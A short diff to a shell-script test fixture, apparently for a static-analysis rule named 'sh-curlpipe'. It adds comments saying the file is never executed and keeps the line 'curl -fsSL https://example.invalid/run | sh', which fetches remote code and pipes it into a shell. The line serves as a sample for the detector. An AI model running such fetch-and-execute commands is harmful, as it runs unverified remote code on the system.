@@ -1,3 +1,4 @@
 #!/bin/sh
-# Fixture only — never executed.
+# Fixture only — never executed. Extensionless; reached by its shebang.
+# ruleid: sh-curlpipe
 curl -fsSL https://example.invalid/run | sh
